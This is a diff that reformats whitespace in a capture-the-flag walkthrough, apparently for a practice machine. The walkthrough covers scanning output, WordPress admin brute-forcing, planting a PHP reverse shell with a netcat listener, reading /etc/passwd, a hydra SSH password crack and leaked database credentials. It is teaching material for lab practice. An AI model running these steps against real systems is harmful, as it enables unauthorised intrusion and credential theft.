@@ -16,7 +16,7 @@ nikto -h $IP
 ```
 
 ??? output "Nmap output"
-    ``` sh
+   ``` sh
     nmap -sC -sV $IP
     Nmap scan report for 10.10.156.30
     Host is up (0.020s latency).
@@ -34,10 +34,10 @@ nikto -h $IP
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
-    ```
+   ```
 
 ??? output "nikto output"
-    ``` sh
+   ``` sh
     nikto -h $IP
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -61,10 +61,10 @@ nikto -h $IP
     + 8042 requests: 0 error(s) and 11 item(s) reported on remote host
     ---------------------------------------------------------------------------
     + 1 host(s) tested
-    ```
+   ```
 
 ??? output "gobuster output"
-    ``` txt
+   ``` txt
     gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
     ===============================================================
     /blog                 (Status: 301) [Size: 311] [--> http://10.10.156.30/blog/]
@@ -72,10 +72,10 @@ nikto -h $IP
     /javascript           (Status: 301) [Size: 317] [--> http://10.10.156.30/javascript/]
     /phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.156.30/phpmyadmin/]
     /server-status        (Status: 403) [Size: 277]
-    ```
+   ```
 
 ??? output "Wordpress output"
-    ``` txt
+   ``` txt
     wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
     _______________________________________________________________
             __          _______   _____
@@ -145,7 +145,7 @@ nikto -h $IP
 
     [!] No WPScan API Token given, as a result vulnerability data has not been output.
     [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-    ```
+   ```
 
 So now we can login to wordpress as admin and look around.
 
@@ -153,14 +153,14 @@ The wordpress page reveals a private note on credentals of william being william
 
 ## Wordpress php reverse shell
 
-I used this [php reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php), modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. ```nc -lvnp 6666``` and call a page that doesn't exist e.g. ```/blog/index.php/2020/08/03/50/``` with e.g. curl.
+I used this [php reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php), modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g.```nc -lvnp 6666``` and call a page that doesn't exist e.g.```/blog/index.php/2020/08/03/50/``` with e.g. curl.
 
-We now get a reverse shell but no TTY so we can try this: ``` python -c 'import pty; pty.spawn("/bin/sh")'``` or this ```/bin/sh -i```.
+We now get a reverse shell but no TTY so we can try this:``` python -c 'import pty; pty.spawn("/bin/sh")'``` or this```/bin/sh -i```.
 
 Let's have a look around:
 
 ??? output "cat /etc/passwd output"
-    ``` sh
+   ``` sh
     cat /etc/passwd
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -193,7 +193,7 @@ Let's have a look around:
     sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
     aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
     mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-    ```
+   ```
 
 The /home path shows one user "aubreanna" so let's use this to crack ssh using hydra:
 
@@ -216,9 +216,9 @@ aubreanna:bubb13guM!@#123
 
 ## Aubreanna
 
-So let's login via aubreanna: ```ssh aubreanna@10.10.156.30``` and we find the first flag (user.txt) in the home dir.
+So let's login via aubreanna:```ssh aubreanna@10.10.156.30``` and we find the first flag (user.txt) in the home dir.
 
-Unfortunately ```sudo -l``` is not allowed
+Unfortunately```sudo -l``` is not allowed
 
 ``` sh
 aubreanna@internal:~$ sudo -l
@@ -255,7 +255,7 @@ define( 'DB_PASSWORD', 'wordpress123' );
 define( 'DB_HOST', 'localhost' );
 ```
 
-We also see we have Sudo running in version ```1.8.21``` and a check with searchsploit ```searchsploit sudo``` reveals a vulnerability to ```1.8.20``` "Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation", but no luck running the [exploit](https://www.exploit-db.com/raw/42183).
+We also see we have Sudo running in version```1.8.21``` and a check with searchsploit```searchsploit sudo``` reveals a vulnerability to```1.8.20``` "Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation", but no luck running the [exploit](https://www.exploit-db.com/raw/42183).
 
 @Kali
 
